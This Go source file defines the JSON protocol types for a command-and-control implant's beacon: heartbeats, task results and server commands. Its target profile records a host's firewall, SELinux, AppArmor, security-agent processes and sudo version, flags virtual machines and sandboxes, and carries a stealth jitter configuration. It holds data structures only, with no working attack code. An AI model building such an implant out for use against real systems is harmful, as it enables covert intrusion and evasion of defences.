package beacon

// Protocol types matching src/c2/types.ts for JSON wire compatibility.

// ImplantHeartbeat sent by the implant on each beacon.
type ImplantHeartbeat struct {
	ImplantID      string           `json:"implantId"`
	Status         string           `json:"status"`
	Uptime         int64            `json:"uptime"`
	Loadavg        [3]float64       `json:"loadavg"`
	Profile        *TargetProfile   `json:"profile,omitempty"`
	PendingResults []PendingResult  `json:"pendingResults"`
}

// PendingResult carries a completed task's output back to the server.
type PendingResult struct {
	TaskID      string `json:"taskId"`
	SequenceNum int    `json:"sequenceNum"`
	Success     bool   `json:"success"`
	Data        string `json:"data"`
	Error       string `json:"error,omitempty"`
	StartedAt   string `json:"startedAt"`
	CompletedAt string `json:"completedAt"`
	RawOutput   string `json:"rawOutput,omitempty"`
}

// TargetProfile mirrors the TypeScript TargetProfile for defense profiling.
type TargetProfile struct {
	OS              string `json:"os,omitempty"`
	Kernel          string `json:"kernel,omitempty"`
	Platform        string `json:"platform,omitempty"`
	PlatformVersion string `json:"platformVersion,omitempty"`
	Hostname        string `json:"hostname,omitempty"`
	CPUArch         string `json:"cpuArch,omitempty"`
	TotalMemory     int64  `json:"totalMemory,omitempty"`
	FreeMemory      int64  `json:"freeMemory,omitempty"`
	Uptime          int64  `json:"uptime,omitempty"`
	Shell           string `json:"shell,omitempty"`

	// Defense detection
	Firewall     string   `json:"firewall,omitempty"`
	SELinux      bool     `json:"selinux,omitempty"`
	AppArmor     bool     `json:"apparmor,omitempty"`
	HasAgent     bool     `json:"hasAgent,omitempty"`
	AgentPids    []int    `json:"agentPids,omitempty"`
	Sudo         bool     `json:"sudo,omitempty"`
	SudoVersion  string   `json:"sudoVersion,omitempty"`
	ThreatLevel  string   `json:"threatLevel,omitempty"`
	Hints        []string `json:"hints,omitempty"`

	// VM/sandbox detection
	IsVM         bool     `json:"isVM,omitempty"`
	VMVendor     string   `json:"vmVendor,omitempty"`
	IsSandbox    bool     `json:"isSandbox,omitempty"`
	CPUCount     int      `json:"cpuCount,omitempty"`
	DiskSizeGB   int64    `json:"diskSizeGB,omitempty"`
	HasBattery   bool     `json:"hasBattery,omitempty"`
}

// ImplantConfig sent from server to configure beacon behaviour.
type ImplantConfig struct {
	BeaconInterval int64         `json:"beaconInterval"`
	StealthConfig  *StealthConfig `json:"stealthConfig,omitempty"`
}

// StealthConfig mirrors the TypeScript StealthConfig.
type StealthConfig struct {
	Enabled        bool  `json:"enabled"`
	MinDelay       int64 `json:"minDelay"`
	MaxDelay       int64 `json:"maxDelay"`
	JitterPercent  int   `json:"jitterPercent"`
}

// C2TaskAssignment is a task the server wants executed.
type C2TaskAssignment struct {
	TaskID string                 `json:"taskId"`
	Type   string                 `json:"type"`
	Params map[string]interface{} `json:"params"`
}

// BeaconResponse from the server after each beacon.
type BeaconResponse struct {
	AckedResults []string         `json:"ackedResults"`
	Tasks        []C2TaskAssignment `json:"tasks"`
	Config       ImplantConfig    `json:"config"`
	Command      string           `json:"command"`
	CommandParam string           `json:"commandParam,omitempty"`
}
